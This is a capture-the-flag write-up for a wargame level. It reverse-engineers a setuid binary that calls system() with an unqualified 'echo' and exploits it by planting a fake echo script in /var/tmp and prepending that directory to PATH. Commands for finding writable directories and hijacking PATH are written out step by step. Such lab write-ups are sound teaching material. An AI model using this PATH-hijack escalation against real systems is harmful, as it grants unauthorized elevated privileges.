## Phase 1: Reconnaissance

Initial investigation involved listing the directory contents with `ls -la`

An executable file was found that, when run, asks to be exploited

This indicates an exercise on reverse engineering and vulnerability exploitation

---

## Phase 2: Target Research on System

I analyzed the file with the following command:

```bash
file ./level03
```

The output was:

```txt
./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

</br>

Further investigation with the `strings` command revealed it's a C file, compiled with GNU C 4.6.3
>A search for vulnerable C functions (such as `strcpy`, `gets`, `scanf`, `sprintf`, `memcpy`) didn't reveal anything interesting

</br>

I used `ltrace` to intercept `.dll` calls and found that the `system()` function is used to call a shell command (`/usr/bin/env echo Exploit me`) which might be exploitable

```bash
ltrace ./level03
```
</br>
I transfered the executable to my local machine and opened it with IDA Free disassembler

>The `main` function of the binary was examined:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+18h] [ebp-8h]
  int v5; // [esp+1Ch] [ebp-4h]

  v4 = getegid();
  v5 = geteuid();
  setresgid(v4, v4, v4);
  setresuid(v5, v5, v5);
  return system("/usr/bin/env echo Exploit me");
}
```


- I found that the function `system("/usr/bin/env echo Exploit me")` searches for the first instance of the `echo` command in the directories listed in the `PATH` environment variable, therefore, creating a fake `echo` command could allow it to be executed instead of the system's `echo`

---

## Phase 3: Exploitation

Writable folders were searched for to start writing the fake `echo` script:

```bash
find / -type d -writable 2>/dev/null
```

A simple test script was created to confirm the vunlnerability and added in `/var/tmp`:

```bash
echo "EXPLOITED"
```

The path of the script was added to the `PATH` environment variable and executable permission was granted:

```bash
export PATH=/var/tmp:$PATH
chmod +x /var/tmp/echo
```

After running the binary again, it successfully prints "EXPLOITED", indicating successful arbitrary code execution

Adding the `whoami` command to the script printed `flag03`, confirming the exploit

---

## Solved

<details>
        <summary>Click to reveal solution</summary>
        Adding the getflag command to the fake echo script, obtain the token, and move to level04
</details>  

---
